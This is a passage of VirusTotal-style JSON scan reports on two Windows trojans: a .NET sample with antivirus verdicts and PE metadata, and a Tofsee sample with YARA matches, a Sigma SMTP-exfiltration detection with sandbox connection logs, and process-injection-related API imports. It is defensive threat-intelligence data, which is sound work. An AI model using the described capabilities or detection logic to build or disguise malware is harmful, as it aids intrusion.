            ],
            "namespace": "System.ComponentModel"
          },
          {
            "type_definitions": [
              "StandardModuleAttribute",
              "DesignerGeneratedAttribute",
              "Utils",
              "ProjectData",
              "ObjectFlowControl"
            ],
            "namespace": "Microsoft.VisualBasic.CompilerServices"
          },
          {
            "type_definitions": [
              "Form",
              "Control",
              "Application",
              "ContainerControl",
              "AutoScaleMode"
            ],
            "namespace": "System.Windows.Forms"
          }
        ],
        "external_assemblies": {
          "Microsoft.VisualBasic": {
            "version": "10.0.0.0"
          },
          "mscorlib": {
            "version": "4.0.0.0"
          },
          "uSmIZfRIgVCEhRUPknbKOqEqvzdK": {
            "version": "0.0.0.0"
          },
          "System": {
            "version": "4.0.0.0"
          },
          "System.Drawing": {
            "version": "4.0.0.0"
          },
          "System.Windows.Forms": {
            "version": "4.0.0.0"
          }
        },
        "tables_rows_map": "15f1703b0b90e09505e00202100060bd8182200100600002ea92",
        "manifest_resource": [
          "WindowsApp1.Resources.resources",
          "\\\\[7@qO4<EL5U\"Sp%Nn932}$=D.resources"
        ],
        "streams": {
          "#GUID": {
            "chi2": 240,
            "md5": "a62eba88af005c197996b7b51c0aebe4",
            "entropy": 4,
            "size": 16
          },
          "#Blob": {
            "chi2": 19588.482421875,
            "md5": "77856181d6662ba3639dc12960e83d06",
            "entropy": 5.5486226081848145,
            "size": 2392
          },
          "#~": {
            "chi2": 241818.09375,
            "md5": "366a13c4fb6f8651d6e27511a63ac9eb",
            "entropy": 5.28463077545166,
            "size": 6204
          },
          "#Strings": {
            "chi2": 1249677.25,
            "md5": "677696bb83749cbb274e5409fbe79a6a",
            "entropy": 3.7005741596221924,
            "size": 34316
          }
        },
        "tables_present": 25,
        "clr_version": "v4.0.30319",
        "unmanaged_methods": {
          "kernel32.dll": [
            "VirtualProtect"
          ]
        },
        "clr_meta_version": "1.1",
        "tables_present_map": "1f093fa29557L",
        "tables_rows_map_log": "4878969847566646444546664"
      },
      "pe_info": {
        "resource_details": [
          {
            "lang": "NEUTRAL",
            "entropy": 3.311088800430298,
            "chi2": 67732.875,
            "filetype": "Data",
            "sha256": "74ad10dfc788903c7050bfba791d834d156905342d33c9ae423195e9fb5de27f",
            "type": "RT_VERSION"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.00111722946167,
            "chi2": 4719.86083984375,
            "filetype": "Data",
            "sha256": "539dc26a14b6277e87348594ab7d6e932d16aabb18612d77f29fe421a9f1d46a",
            "type": "RT_MANIFEST"
          }
        ],
        "resource_types": {
          "RT_MANIFEST": 1,
          "RT_VERSION": 1
        },
        "imphash": "f34d5f2d4577ed6d9ceec516c1f5a744",
        "resource_langs": {
          "NEUTRAL": 2
        },
        "machine_type": 332,
        "timestamp": {
          "$numberLong": "2438869553"
        },
        "entry_point": 106506,
        "sections": [
          {
            "name": "PrydGT",
            "chi2": 291.33,
            "virtual_address": 8192,
            "entropy": 7.99,
            "raw_size": 29696,
            "flags": "rwx",
            "virtual_size": 29340,
            "md5": "f524929467d3741c2f83db53b4ac2733"
          },
          {
            "name": ".text",
            "chi2": 1013831.75,
            "virtual_address": 40960,
            "entropy": 4.87,
            "raw_size": 45568,
            "flags": "rx",
            "virtual_size": 45248,
            "md5": "f2dc9c901921c41f13a4d3207d19e686"
          },
          {
            "name": ".rsrc",
            "chi2": 76468.82,
            "virtual_address": 90112,
            "entropy": 4.13,
            "raw_size": 1536,
            "flags": "r",
            "virtual_size": 1464,
            "md5": "75df3605a53d6416d6d45c6a527d099c"
          },
          {
            "name": ".reloc",
            "chi2": 128016,
            "virtual_address": 98304,
            "entropy": 0.1,
            "raw_size": 512,
            "flags": "r",
            "virtual_size": 12,
            "md5": "aff5b30ceb43f61f913db3abeba94533"
          },
          {
            "name": "",
            "chi2": 127509,
            "virtual_address": 106496,
            "entropy": 0.12,
            "raw_size": 512,
            "flags": "rx",
            "virtual_size": 16,
            "md5": "0841e4d624d6162642cf08e9c82cc24c"
          }
        ],
        "import_list": [
          {
            "library_name": "mscoree.dll",
            "imported_functions": [
              "_CorExeMain"
            ]
          }
        ]
      },
      "magic": "PE32 executable for MS Windows (GUI) Intel 80386 32-bit Mono/.Net assembly",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 5,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 51,
        "undetected": 20
      },
      "last_analysis_results": {
        "Bkav": {
          "category": "undetected",
          "engine_name": "Bkav",
          "engine_version": "1.3.0.9899",
          "result": null,
          "method": "blacklist",
          "engine_update": "20201204"
        },
        "Lionic": {
          "category": "malicious",
          "engine_name": "AegisLab",
          "engine_version": "4.2",
          "result": "Trojan.MSIL.Agent.4!c",
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "Elastic": {
          "category": "malicious",
          "engine_name": "Elastic",
          "engine_version": "4.0.13",
          "result": "malicious (high confidence)",
          "method": "blacklist",
          "engine_update": "20201204"
        },
        "MicroWorld-eScan": {
          "category": "malicious",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": "Gen:Variant.MSILPerseus.192163",
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.10.2019.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20201204"
        },
        "CAT-QuickHeal": {
          "category": "undetected",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "14.00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "McAfee": {
          "category": "malicious",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": "Artemis!8870C9B41664",
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "Cylance": {
          "category": "malicious",
          "engine_name": "Cylance",
          "engine_version": "2.3.1.101",
          "result": "Unsafe",
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "VIPRE": {
          "category": "malicious",
          "engine_name": "VIPRE",
          "engine_version": "88694",
          "result": "Trojan.Win32.Generic!BT",
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "Sangfor": {
          "category": "undetected",
          "engine_name": "Sangfor",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20201125"
        },
        "K7AntiVirus": {
          "category": "malicious",
          "engine_name": "K7AntiVirus",
          "engine_version": "11.154.35885",
          "result": "Trojan ( 005519b61 )",
          "method": "blacklist",
          "engine_update": "20201204"
        },
        "Alibaba": {
          "category": "malicious",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": "Trojan:MSIL/Kryptik.f21f18ed",
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "malicious",
          "engine_name": "K7GW",
          "engine_version": "11.154.35872",
          "result": "Trojan ( 005519b61 )",
          "method": "blacklist",
          "engine_update": "20201204"
        },
        "Cybereason": {
          "category": "malicious",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": "malicious.d0ccfa",
          "method": "blacklist",
          "engine_update": "20190616"
        },
        "BitDefenderTheta": {
          "category": "malicious",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": "Gen:NN.ZemsilF.34670.eu0@aCUw@gl",
          "method": "blacklist",
          "engine_update": "20201202"
        },
        "Cyren": {
          "category": "malicious",
          "engine_name": "Cyren",
          "engine_version": "6.3.0.2",
          "result": "W32/MSIL_Troj.NT.gen!Eldorado",
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20200813"
        },
        "Symantec": {
          "category": "malicious",
          "engine_name": "Symantec",
          "engine_version": "1.13.0.0",
          "result": "ML.Attribute.HighConfidence",
          "method": "blacklist",
          "engine_update": "20201204"
        },
        "TotalDefense": {
          "category": "undetected",
          "engine_name": "TotalDefense",
          "engine_version": "37.1.62.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20201204"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "TrendMicro-HouseCall": {
          "category": "malicious",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": "TROJ_GEN.R022C0GH120",
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "Paloalto": {
          "category": "malicious",
          "engine_name": "Paloalto",
          "engine_version": "1.0",
          "result": "generic.ml",
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "ClamAV": {
          "category": "undetected",
          "engine_name": "ClamAV",
          "engine_version": "0.102.3.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20201204"
        },
        "Kaspersky": {
          "category": "malicious",
          "engine_name": "Kaspersky",
          "engine_version": "15.0.1.13",
          "result": "HEUR:Trojan.MSIL.Agent.gen",
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "BitDefender": {
          "category": "malicious",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": "Gen:Variant.MSILPerseus.192163",
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "NANO-Antivirus": {
          "category": "malicious",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25241",
          "result": "Trojan.Win32.Kryptik.fsrlbr",
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20201204"
        },
        "APEX": {
          "category": "malicious",
          "engine_name": "APEX",
          "engine_version": "6.104",
          "result": "Malicious",
          "method": "blacklist",
          "engine_update": "20201204"
        },
        "Rising": {
          "category": "undetected",
          "engine_name": "Rising",
          "engine_version": "25.0.0.26",
          "result": null,
          "method": "blacklist",
          "engine_update": "20201204"
        },
        "Ad-Aware": {
          "category": "malicious",
          "engine_name": "Ad-Aware",
          "engine_version": "3.0.16.117",
          "result": "Gen:Variant.MSILPerseus.192163",
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "Emsisoft": {
          "category": "malicious",
          "engine_name": "Emsisoft",
          "engine_version": "2018.12.0.1641",
          "result": "Gen:Variant.MSILPerseus.192163 (B)",
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "Comodo": {
          "category": "malicious",
          "engine_name": "Comodo",
          "engine_version": "33049",
          "result": "Malware@#3ns9yxygmjp4d",
          "method": "blacklist",
          "engine_update": "20201204"
        },
        "F-Secure": {
          "category": "malicious",
          "engine_name": "F-Secure",
          "engine_version": "12.0.86.52",
          "result": "Heuristic.HEUR/AGEN.1139799",
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "DrWeb": {
          "category": "undetected",
          "engine_name": "DrWeb",
          "engine_version": "7.0.49.9080",
          "result": null,
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "Zillya": {
          "category": "malicious",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.4238",
          "result": "Trojan.Agent.Win32.1113362",
          "method": "blacklist",
          "engine_update": "20201203"
        },
        "TrendMicro": {
          "category": "malicious",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": "TROJ_GEN.R022C0GH120",
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "McAfee-GW-Edition": {
          "category": "malicious",
          "engine_name": "McAfee-GW-Edition",
          "engine_version": "v2019.1.2+3728",
          "result": "BehavesLike.Win32.Generic.lh",
          "method": "blacklist",
          "engine_update": "20201204"
        },
        "Trapmine": {
          "category": "type-unsupported",
          "engine_name": "Trapmine",
          "engine_version": "3.5.0.1023",
          "result": null,
          "method": "blacklist",
          "engine_update": "20200727"
        },
        "FireEye": {
          "category": "malicious",
          "engine_name": "FireEye",
          "engine_version": "32.36.1.0",
          "result": "Generic.mg.8870c9b41664633d",
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "Sophos": {
          "category": "malicious",
          "engine_name": "Sophos",
          "engine_version": "1.0.2.0",
          "result": "Mal/Generic-S",
          "method": "blacklist",
          "engine_update": "20201204"
        },
        "Ikarus": {
          "category": "malicious",
          "engine_name": "Ikarus",
          "engine_version": "0.1.5.2",
          "result": "Trojan.MSIL.ClipBanker",
          "method": "blacklist",
          "engine_update": "20201204"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "201204-00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20201204"
        },
        "Jiangmin": {
          "category": "malicious",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": "Trojan.MSIL.lqbj",
          "method": "blacklist",
          "engine_update": "20201204"
        },
        "eGambit": {
          "category": "malicious",
          "engine_name": "eGambit",
          "engine_version": null,
          "result": "Unsafe.AI_Score_99%",
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "Avira": {
          "category": "malicious",
          "engine_name": "Avira",
          "engine_version": "8.3.3.10",
          "result": "HEUR/AGEN.1139799",
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "MAX": {
          "category": "malicious",
          "engine_name": "MAX",
          "engine_version": "2019.9.16.1",
          "result": "malware (ai score=99)",
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "Antiy-AVL": {
          "category": "malicious",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0.0.1",
          "result": "Trojan/MSIL.Agent",
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "Kingsoft": {
          "category": "undetected",
          "engine_name": "Kingsoft",
          "engine_version": "2017.9.26.565",
          "result": null,
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "Microsoft": {
          "category": "malicious",
          "engine_name": "Microsoft",
          "engine_version": "1.1.17600.5",
          "result": "Backdoor:Win32/Bladabindi!ml",
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "Gridinsoft": {
          "category": "malicious",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.19.109",
          "result": "Trojan.Heur!.03012281",
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "Arcabit": {
          "category": "malicious",
          "engine_name": "Arcabit",
          "engine_version": "1.0.0.881",
          "result": "Trojan.MSILPerseus.D2EEA3",
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20201204"
        },
        "ZoneAlarm": {
          "category": "malicious",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": "HEUR:Trojan.MSIL.Agent.gen",
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "A:25.27887B:27.21110",
          "result": "Gen:Variant.MSILPerseus.192163",
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "Cynet": {
          "category": "malicious",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.24",
          "result": "Malicious (score: 100)",
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20200916"
        },
        "AhnLab-V3": {
          "category": "undetected",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.19.3.10105",
          "result": null,
          "method": "blacklist",
          "engine_update": "20201204"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.1.1.80",
          "result": null,
          "method": "blacklist",
          "engine_update": "20201023"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "4.4.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20201204"
        },
        "ALYac": {
          "category": "malicious",
          "engine_name": "ALYac",
          "engine_version": "1.1.1.5",
          "result": "Gen:Variant.MSILPerseus.192163",
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2020-12-05.01",
          "result": null,
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "Malwarebytes": {
          "category": "undetected",
          "engine_name": "Malwarebytes",
          "engine_version": "3.6.4.335",
          "result": null,
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "Panda": {
          "category": "malicious",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": "Trj/GdSda.A",
          "method": "blacklist",
          "engine_update": "20201204"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "0.0.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20201204"
        },
        "ESET-NOD32": {
          "category": "undetected",
          "engine_name": "ESET-NOD32",
          "engine_version": "22430",
          "result": null,
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "Tencent": {
          "category": "malicious",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": "Msil.Trojan.Agent.Ebgq",
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "Yandex": {
          "category": "malicious",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": "Trojan.Agent!bk2BebiEzVg",
          "method": "blacklist",
          "engine_update": "20201204"
        },
        "SentinelOne": {
          "category": "malicious",
          "engine_name": "SentinelOne",
          "engine_version": "4.7.0.15",
          "result": "Static AI - Malicious PE",
          "method": "blacklist",
          "engine_update": "20201129"
        },
        "MaxSecure": {
          "category": "malicious",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": "Trojan.Malware.8703358.susgen",
          "method": "blacklist",
          "engine_update": "20201203"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "6.2.142.0",
          "result": "MSIL/Kryptik.SDH!tr",
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "Webroot": {
          "category": "undetected",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": null,
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "20.10.5736.0",
          "result": "Win32:Trojan-gen",
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "20.10.5736.0",
          "result": "Win32:Trojan-gen",
          "method": "blacklist",
          "engine_update": "20201205"
        },
        "CrowdStrike": {
          "category": "malicious",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": "win/malicious_confidence_100% (W)",
          "method": "blacklist",
          "engine_update": "20190702"
        },
        "Qihoo-360": {
          "category": "malicious",
          "engine_name": "Qihoo-360",
          "engine_version": "1.0.0.1120",
          "result": "Win32/Trojan.289",
          "method": "blacklist",
          "engine_update": "20201205"
        }
      },
      "reputation": 0
    },
    "type": "file",
    "id": "d78980d8f52495b9f8fe619b130b893372052fb63a6e9efe9665beec0321b023",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/d78980d8f52495b9f8fe619b130b893372052fb63a6e9efe9665beec0321b023"
    }
  }
},
{
  "_id": {
    "$oid": "65b5026276c8536d68b498b8"
  },
  "data": {
    "attributes": {
      "type_description": "Win32 EXE",
      "tlsh": "T1EE638D57F4E1A0B1E493017676947F669BFEDD35392EE893E7010EC1A9A48C0DB2D283",
      "vhash": "074046656d156218z519z15z23z24z187z",
      "type_tags": [
        "executable",
        "windows",
        "win32",
        "pe",
        "peexe"
      ],
      "crowdsourced_yara_results": [
        {
          "description": "Detects Tofsee",
          "source": "https://github.com/ditekshen/detection",
          "author": "ditekSHen",
          "ruleset_name": "malware",
          "rule_name": "MALWARE_Win_Tofsee",
          "ruleset_id": "00cc803bdc"
        },
        {
          "ruleset_id": "015f113f40",
          "rule_name": "Windows_Trojan_Tofsee_26124fe4",
          "ruleset_name": "Windows_Trojan_Tofsee",
          "source": "https://github.com/elastic/protections-artifacts",
          "author": "Elastic Security"
        }
      ],
      "creation_date": 1515838117,
      "names": [
        "1016a48908fb15bf6228eadf67560f5f406f30c5f752e6d76c260822cbf94783"
      ],
      "last_modification_date": 1680427378,
      "type_tag": "peexe",
      "times_submitted": 1,
      "total_votes": {
        "harmless": 0,
        "malicious": 1
      },
      "size": 72704,
      "popular_threat_classification": {
        "suggested_threat_label": "trojan.tofsee/invader",
        "popular_threat_category": [
          {
            "count": 40,
            "value": "trojan"
          }
        ],
        "popular_threat_name": [
          {
            "count": 25,
            "value": "tofsee"
          },
          {
            "count": 3,
            "value": "invader"
          },
          {
            "count": 2,
            "value": "backdoorx"
          }
        ]
      },
      "authentihash": "a4ad89c1939824293a1a0edc509c85bdb35b3a9f0da0be13e771a21a3a65cfb6",
      "detectiteasy": {
        "filetype": "PE32",
        "values": [
          {
            "version": "2010",
            "type": "Compiler",
            "name": "Microsoft Visual C/C++"
          },
          {
            "info": "GUI32",
            "version": "10.0",
            "type": "Linker",
            "name": "Microsoft Linker"
          }
        ]
      },
      "last_submission_date": 1569274013,
      "sigma_analysis_results": [
        {
          "rule_title": "Suspicious Outbound SMTP Connections",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "EventID": "3",
                "ProcessId": "4976",
                "DestinationPortName": "smtp",
                "Protocol": "tcp",
                "DestinationIp": "104.47.54.36",
                "Initiated": "true",
                "SourcePortName": "-",
                "Image": "C:\\Users\\george\\Desktop\\program.exe",
                "ProcessGuid": "{C784477D-C705-63B1-E905-000000004700}",
                "DestinationHostname": "-",
                "UtcTime": "1671773929",
                "User": "DESKTOP-B0T93D6\\george",
                "DestinationPort": "25",
                "RuleName": "Usermode",
                "SourcePort": "49698",
                "SourceIsIpv6": "false",
                "SourceHostname": "DESKTOP-B0T93D6.local",
                "SourceIp": "192.168.2.16",
                "DestinationIsIpv6": "false"
              }
            },
            {
              "values": {
                "EventID": "3",
                "ProcessId": "4976",
                "DestinationPortName": "smtp",
                "SourceIsIpv6": "false",
                "DestinationIp": "104.47.53.36",
                "Initiated": "true",
                "SourcePortName": "-",
                "Image": "C:\\Users\\george\\Desktop\\program.exe",
                "ProcessGuid": "{C784477D-C705-63B1-E905-000000004700}",
                "DestinationHostname": "-",
                "UtcTime": "1671773976",
                "User": "DESKTOP-B0T93D6\\george",
                "DestinationPort": "25",
                "RuleName": "Usermode",
                "SourcePort": "49723",
                "Protocol": "tcp",
                "DestinationIsIpv6": "false",
                "SourceIp": "192.168.2.16",
                "SourceHostname": "DESKTOP-B0T93D6.local"
              }
            },
            {
              "values": {
                "EventID": "3",
                "ProcessId": "4976",
                "DestinationPortName": "smtp",
                "Protocol": "tcp",
                "DestinationIp": "52.101.40.29",
                "Initiated": "true",
                "SourcePortName": "-",
                "Image": "C:\\Users\\george\\Desktop\\program.exe",
                "ProcessGuid": "{C784477D-C705-63B1-E905-000000004700}",
                "DestinationHostname": "-",
                "UtcTime": "1671774017",
                "User": "DESKTOP-B0T93D6\\george",
                "DestinationPort": "25",
                "RuleName": "Usermode",
                "SourcePort": "49749",
                "SourceIsIpv6": "false",
                "SourceHostname": "DESKTOP-B0T93D6.local",
                "SourceIp": "192.168.2.16",
                "DestinationIsIpv6": "false"
              }
            }
          ],
          "rule_level": "medium",
          "rule_description": "Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel.\nThe data may also be sent to an alternate network location from the main command and control server.\n",
          "rule_author": "frack113",
          "rule_id": "3659f9925f327ac0ba2be9b3c8c7240f432c4b62f162b846c10410fff320b6f7"
        }
      ],
      "reputation": -1,
      "trid": [
        {
          "file_type": "Win32 Executable MS Visual C++ (generic)",
          "probability": 47.3
        },
        {
          "file_type": "Win64 Executable (generic)",
          "probability": 15.9
        },
        {
          "file_type": "Win32 Dynamic Link Library (generic)",
          "probability": 9.9
        },
        {
          "file_type": "Win16 NE executable (generic)",
          "probability": 7.6
        },
        {
          "file_type": "Win32 Executable (generic)",
          "probability": 6.8
        }
      ],
      "sigma_analysis_summary": {
        "Sigma Integrated Rule Set (GitHub)": {
          "high": 0,
          "medium": 1,
          "critical": 0,
          "low": 0
        }
      },
      "sandbox_verdicts": {
        "SecondWrite": {
          "category": "malicious",
          "sandbox_name": "SecondWrite",
          "malware_classification": [
            "MALWARE",
            "TROJAN"
          ]
        }
      },
      "sha256": "1016a48908fb15bf6228eadf67560f5f406f30c5f752e6d76c260822cbf94783",
      "type_extension": "exe",
      "tags": [
        "peexe",
        "runtime-modules",
        "checks-network-adapters",
        "long-sleeps",
        "direct-cpu-clock-access",
        "nxdomain",
        "checks-user-input",
        "detect-debug-environment"
      ],
      "last_analysis_date": 1672642163,
      "unique_sources": 1,
      "first_submission_date": 1569274013,
      "sha1": "c20571d9c9850a339dd317f90d5cf8245926d4f6",
      "ssdeep": "1536:6kws21VCbEjTxSYytuzTjFWL9OdpITHUc:65VCbexSYQuzFPpIT0",
      "md5": "a57cb42761bd223839d5051b47510f23",
      "pe_info": {
        "rich_pe_header_hash": "a847907b684f83031763bebda6777aaf",
        "timestamp": 1515838117,
        "compiler_product_versions": [
          "[---] Unmarked objects count=145",
          "[IMP] VS2008 SP1 build 30729 count=15",
          "id: 174, version: 30319 count=1",
          "[ASM] VS2010 build 30319 count=1",
          "[C++] VS2010 build 30319 count=27",
          "[LNK] VS2010 build 30319 count=1"
        ],
        "entry_point": 39531,
        "machine_type": 332,
        "imphash": "0bdef4d92a94790d7d279561a490c5bb",
        "sections": [
          {
            "name": ".text",
            "chi2": 363439.12,
            "virtual_address": 4096,
            "flags": "rx",
            "raw_size": 58880,
            "entropy": 6.48,
            "virtual_size": 58544,
            "md5": "dcd513ae4cce77dd0d28120c60ee4d26"
          },
          {
            "name": ".rdata",
            "chi2": 85109.25,
            "virtual_address": 65536,
            "flags": "r",
            "raw_size": 8192,
            "entropy": 6.21,
            "virtual_size": 7834,
            "md5": "f9f30209be60d8a982062f923ae28c9c"
          },
          {
            "name": ".data",
            "chi2": 71131,
            "virtual_address": 73728,
            "flags": "rw",
            "raw_size": 512,
            "entropy": 2.38,
            "virtual_size": 6488,
            "md5": "01aadca66fa9030e0ca9496df2433f61"
          },
          {
            "name": ".reloc",
            "chi2": 28432.5,
            "virtual_address": 81920,
            "flags": "r",
            "raw_size": 4096,
            "entropy": 6.48,
            "virtual_size": 4082,
            "md5": "3e797fc0f5fba530e1f807a46f212595"
          }
        ],
        "import_list": [
          {
            "library_name": "dbghelp.dll",
            "imported_functions": [
              "StackWalk64"
            ]
          },
          {
            "library_name": "KERNEL32.dll",
            "imported_functions": [
              "CloseHandle",
              "ConnectNamedPipe",
              "CreateEventA",
              "CreateFileA",
              "CreateFileW",
              "CreateNamedPipeA",
              "CreateProcessA",
              "CreateThread",
              "DeleteFileA",
              "DeviceIoControl",
              "DisconnectNamedPipe",
              "ExitProcess",
              "FileTimeToLocalFileTime",
              "FileTimeToSystemTime",
              "FreeLibrary",
              "GetCommandLineA",
              "GetComputerNameA",
              "GetCurrentProcess",
              "GetCurrentThreadId",
              "GetDiskFreeSpaceA",
              "GetDriveTypeA",
              "GetEnvironmentVariableA",
              "GetFileAttributesExA",
              "GetFileSize",
              "GetLastError",
              "GetLocalTime",
              "GetModuleFileNameA",
              "GetModuleHandleA",
              "GetOverlappedResult",
              "GetProcAddress",
              "GetProcessHeap",
              "GetStartupInfoW",
              "GetSystemDirectoryA",
              "GetSystemInfo",
              "GetSystemTime",
              "GetSystemTimeAsFileTime",
              "GetTempPathA",
              "GetThreadContext",
              "GetTickCount",
              "GetTimeZoneInformation",
              "GetVersionExA",
              "GetVolumeInformationA",
              "GetWindowsDirectoryA",
              "HeapAlloc",
              "HeapFree",
              "HeapReAlloc",
              "HeapSize",
              "InterlockedDecrement",
              "InterlockedExchange",
              "InterlockedIncrement",
              "IsBadCodePtr",
              "IsBadReadPtr",
              "IsBadWritePtr",
              "LoadLibraryA",
              "LocalAlloc",
              "LocalFree",
              "lstrcatA",
              "lstrcmpA",
              "lstrcmpiA",
              "lstrcpyA",
              "lstrcpynA",
              "lstrlenA",
              "lstrlenW",
              "MultiByteToWideChar",
              "ReadFile",
              "ResumeThread",
              "SetErrorMode",
              "SetFileAttributesA",
              "SetFilePointer",
              "SetThreadContext",
              "SetUnhandledExceptionFilter",
              "Sleep",
              "SystemTimeToFileTime",
              "TerminateProcess",
              "VirtualAlloc",
              "VirtualAllocEx",
              "VirtualFree",
              "VirtualProtect",
              "WaitForSingleObject",
              "WriteFile",
              "WriteProcessMemory"
            ]
          },
          {
            "library_name": "OLEAUT32.dll",
            "imported_functions": [
              "SysAllocStringByteLen"
            ]
          },
          {
            "library_name": "ADVAPI32.dll",
            "imported_functions": [
              "AllocateAndInitializeSid",
              "CheckTokenMembership",
              "ConvertSidToStringSidA",
              "CreateProcessWithLogonW",
              "DeleteAce",
              "EqualSid",
              "FreeSid",
              "GetAce",
              "GetFileSecurityA",
              "GetLengthSid",
              "GetSecurityDescriptorDacl",
              "GetSecurityDescriptorOwner",
              "GetUserNameA",
              "GetUserNameW",
              "InitializeSecurityDescriptor",
              "LookupAccountNameA",
              "LookupAccountNameW",
              "RegCloseKey",
              "RegCreateKeyExA",
              "RegDeleteValueA",
              "RegEnumKeyA",
              "RegEnumValueA",
              "RegGetKeySecurity",
              "RegisterServiceCtrlHandlerA",
              "RegOpenKeyExA",
              "RegQueryValueExA",
              "RegSetKeySecurity",
              "RegSetValueExA",
              "SetFileSecurityA",
              "SetSecurityDescriptorDacl",
              "SetSecurityDescriptorOwner",
              "SetServiceStatus",
              "StartServiceCtrlDispatcherA"
